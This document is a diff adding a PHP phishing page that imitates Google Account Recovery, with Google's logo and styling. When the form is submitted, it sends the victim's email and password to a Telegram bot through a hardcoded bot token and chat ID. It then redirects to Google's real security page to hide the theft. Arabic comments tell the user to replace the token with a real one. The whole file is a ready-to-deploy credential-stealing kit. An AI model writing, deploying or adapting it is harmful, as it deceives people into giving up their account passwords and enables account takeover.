@@ -1,0 +1,71 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $email = htmlspecialchars($_POST['email']);
+    $password = htmlspecialchars($_POST['password']);
+
+    $token = "7974833718:AAEkJZ66-Sz_m8uP663whBH2yTmktnCGmP4"; // بدّل دي بالتوكن الحقيقي
+    $chat_id = "6817512459"; // بدّل دي بـ chat_id الحقيقي
+    $text = "Google Reset Attempt:%0AEmail: $email%0APassword: $password";
+
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$text";
+
+    file_get_contents($url);
+
+    header('Location: https://myaccount.google.com/security-checkup');
+    exit();
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Account Recovery</title>
+  <style>
+    body {
+      background: #f2f2f2;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .container {
+      background: white;
+      width: 360px;
+      margin: 100px auto;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+    <h2>Account Recovery</h2>
+    <form method="POST">
+      <input type="email" name="email" placeholder="Enter your email" required>
+      <input type="password" name="password" placeholder="Enter your new password" required>
+      <button type="submit">Continue</button>
+    </form>
+  </div>
+</body>
+</html>
